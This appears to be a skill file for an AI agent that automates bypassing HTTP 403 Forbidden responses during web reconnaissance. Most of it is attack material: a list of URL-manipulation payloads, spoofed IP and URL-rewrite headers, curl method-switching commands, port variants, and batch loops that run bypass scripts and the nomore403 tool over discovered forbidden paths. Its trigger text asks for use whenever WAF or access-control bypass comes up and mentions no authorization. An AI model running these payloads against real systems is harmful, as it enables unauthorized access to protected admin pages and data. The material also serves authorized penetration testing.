---
name: 403Bypass
description: Automated 403 Forbidden bypass testing using Jason Haddix's techniques. USE WHEN you encounter 403 responses during recon, content discovery returns 403 paths, or user mentions 403 bypass, forbidden bypass, access control bypass, or WAF bypass.
---

# 403 Bypass Skill

Automated testing of 403 Forbidden bypass techniques based on [Arcanum's hack_tips](https://github.com/Arcanum-Sec/hack_tips/blob/main/403bypass.md).

## When to Use

- Content discovery finds 403 paths
- Recon identifies forbidden endpoints
- User asks to bypass 403/forbidden
- Testing access control misconfigurations

## Quick Start

```bash
# Test single URL
~/clawd/skills/403Bypass/scripts/bypass403.sh https://target.com/admin

# Test multiple URLs from file
cat 403-urls.txt | xargs -I {} ~/clawd/skills/403Bypass/scripts/bypass403.sh {}

# Use nomore403 tool (more comprehensive)
nomore403 -u https://target.com/admin
```

## Bypass Techniques

### 1. URL Manipulation (Top 77 - Seclists jhaddix list)

These work best on config files and global dashboards:

```
/admin/?
//admin//
///admin///
/./admin/./
/admin??
/admin/?/
/admin/..
/admin/../
/admin/./
/admin/.
/admin/.//
/admin/*
/admin/%2f
/admin/%20
/admin/%09
/admin/%0a
/admin/%0d
/admin/%25
/admin/%23
/admin/%26
/admin/%3f
/admin/#
/admin/#/
/./admin
/..;/admin
/.;/admin
/;/admin
//;//admin
/%2e/admin
/admin/..;/
/admin.json
/admin/.json
/admin..;/
/admin;/
/admin%00
/admin.css
/admin.html
/admin?id=1
/admin~
/admin/°/
/admin/&
/admin/-
/admin\/\/
/admin/..%3B/
/admin/;%2f..%2f..%2f
/ADMIN
/admin/..\;/
/*/admin
/ADM+IN
```

### 2. Header Manipulation

Add these headers to requests:

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-Original-Method: GET
X-HTTP-Method-Override: GET
```

### 3. HTTP Method Switching

```bash
# Try different methods
curl -X POST https://target.com/admin
curl -X PUT https://target.com/admin
curl -X PATCH https://target.com/admin
curl -X DELETE https://target.com/admin
curl -X OPTIONS https://target.com/admin
curl -X TRACE https://target.com/admin
curl -X CONNECT https://target.com/admin
```

### 4. Protocol/Port Manipulation

```
# HTTP instead of HTTPS
http://target.com/admin

# Different ports
https://target.com:443/admin
https://target.com:8443/admin
https://target.com:80/admin
```

## Automated Tool

**Recommended:** [nomore403](https://github.com/devploit/nomore403)

```bash
# Install
go install github.com/devploit/nomore403@latest

# Use
nomore403 -u https://target.com/admin
nomore403 -u https://target.com/admin -m POST
```

## Why These Work

| Technique | Reason |
|-----------|--------|
| Multiple slashes | Servers normalize differently than WAFs |
| Dot segments (./, ../) | Path normalization bypasses access control |
| Query strings (?, ??) | Some checks only inspect path before ? |
| Special chars (;, #, *) | Break path validation routines |
| Encoding (%2f, %20) | WAFs decode once, server decodes again |
| Case variation (ADMIN) | Case-sensitive WAF, case-insensitive server |
| Extensions (.json, .css) | Extension-based filters miss these |
| Headers (X-Forwarded-For) | Backend trusts proxy headers for IP checks |

## Integration with Content Discovery

After running content discovery, extract 403s and test:

```bash
# Extract 403 URLs from ffuf results
cat *-discovery.json | jq -r '.results[] | select(.status == 403) | .url' > 403-urls.txt

# Test each one
while read url; do
  echo "=== Testing: $url ==="
  ~/clawd/skills/403Bypass/scripts/bypass403.sh "$url"
done < 403-urls.txt
```

## Script Reference

### scripts/bypass403.sh

Quick bypass tester for single URL:

```bash
~/clawd/skills/403Bypass/scripts/bypass403.sh <url>
```

Output shows status codes for each technique. Look for non-403 responses (200, 302, 401, 500 all indicate potential bypass).

### scripts/bypass403-batch.sh

Batch processing with parallel execution:

```bash
~/clawd/skills/403Bypass/scripts/bypass403-batch.sh <urls-file> [threads]
```

## References

- [Arcanum hack_tips - 403bypass.md](https://github.com/Arcanum-Sec/hack_tips/blob/main/403bypass.md)
- [nomore403 tool](https://github.com/devploit/nomore403)
- [HackTricks - 403 Bypass](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses)
